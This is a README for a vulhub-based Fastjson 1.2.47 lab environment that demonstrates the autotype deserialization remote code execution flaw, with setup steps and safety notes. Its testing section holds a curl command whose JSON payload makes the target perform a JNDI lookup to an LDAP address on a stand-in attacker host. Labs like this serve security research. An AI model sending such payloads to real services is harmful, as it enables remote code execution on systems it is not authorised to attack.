# Fastjson Remote Code Execution

## Vulnerability Description

Fastjson is a high-performance JSON library, but its autotype mechanism has deserialization vulnerabilities. Attackers can trigger JNDI injection or execute arbitrary code by constructing special JSON data.

## Vulnerability Information

- **Vulnerability Type**: RCE (Remote Code Execution)
- **Severity**: High
- **Affected Versions**: Fastjson < 1.2.48

## Environment Information

- **Image**: vulhub/fastjson:1.2.47
- **Port**: 8090
- **Service**: Fastjson RCE testing environment

## Usage

1. Execute the userdata script on the cloud server
2. The script will automatically install Docker and start the Fastjson vulnerability environment
3. Access `http://<your-ip>:8090` for testing

## Testing Method

```bash
# Send malicious JSON data (requires JNDI tool cooperation)
curl -X POST "http://<your-ip>:8090" -d '{"@type":"com.sun.rowset.JdbcRowSet1","dataSourceName":"ldap://<attacker>/Exploit","autoCommit":true}'
```

## Notes

- This environment is for security research only
- Please restrict access sources in the firewall
- Please delete the environment in time after testing

## References

- [Vulhub Fastjson Vulnerability Environment](https://github.com/vulhub/vulhub/tree/master/fastjson)
